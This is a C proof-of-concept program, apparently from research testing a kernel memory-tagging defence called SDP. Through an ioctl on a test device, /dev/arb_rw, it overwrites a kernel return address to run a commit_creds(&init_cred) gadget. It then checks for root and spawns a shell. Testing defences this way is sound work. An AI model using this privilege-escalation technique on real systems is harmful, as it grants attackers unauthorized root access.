// FZY: Add a simple control-flow hijacking proof of concept that overwrites the return address to execute a commit_creds(&init_cred) gadget
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>

// FZY: Return-address overwrite. use_tagged: 0 = plain ld/sd (naive attacker),
// 3 = tagged ld_sdp/sd_sdp (attacker reaching for the tagged instructions). On an
// SDP kernel both trap (plain on STag, tagged on TTag mismatch) and fail.
struct arb_ret_overwrite_request {
  int use_tagged;
};

#define ARB_RET_OVERWRITE _IOW('A', 3, struct arb_ret_overwrite_request)

int main(int argc, char **argv) {
  int fd;
  struct arb_ret_overwrite_request req = {0};
  int mode = (argc >= 2) ? atoi(argv[1]) : 0;

  req.use_tagged = (mode == 3);  // mode 3 == tagged ld_sdp/sd_sdp

  printf("=== Return Address Overwrite Demo (%s) ===\n\n",
         req.use_tagged ? "tagged ld_sdp/sd_sdp" : "plain ld/sd");
  if (argc < 2)
    printf("Usage: %s <mode>   (0 = plain ld/sd, 3 = tagged ld_sdp/sd_sdp); "
           "defaulting to 0.\n\n", argv[0]);

  fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("Failed to open /dev/arb_rw");
    return 1;
  }

  printf("[+] Before attack: uid=%d euid=%d\n", getuid(), geteuid());

  printf("Triggering return address overwrite...\n\n");

  if (ioctl(fd, ARB_RET_OVERWRITE, &req) < 0) {
    perror("ioctl failed");
    close(fd);
    return 1;
  }

  printf("ioctl completed! Check kernel logs: sudo dmesg | tail -20\n");

  // The gadget the return address was redirected to runs commit_creds(&init_cred)
  // in our own process context, so we come back from the ioctl as root.
  uid_t uid = getuid();
  uid_t euid = geteuid();
  printf("[+] After attack:  uid=%d euid=%d\n", uid, euid);

  if (uid == 0 && euid == 0) {
    printf("\n[+] === PRIVILEGE ESCALATION SUCCESS ===\n");
    printf("[+] The gadget ran at function return and we are root. "
           "Spawning a shell...\n");
    printf("[+] Check dmesg for 'commit_creds done'\n\n");
    fflush(stdout);
    close(fd);
    execl("/bin/sh", "sh", NULL);
    perror("execl");
    return 1;
  }

  printf("\n[-] Privilege escalation did not happen (uid=%d)\n", uid);
  printf("Unprotected kernel: gadget_function runs commit_creds(&init_cred) "
         "and the process becomes root.\n");
  printf("SDP-enforcing kernel: the overwrite traps (STag/TTag mismatch) and fails.\n");

  close(fd);
  return 0;
}
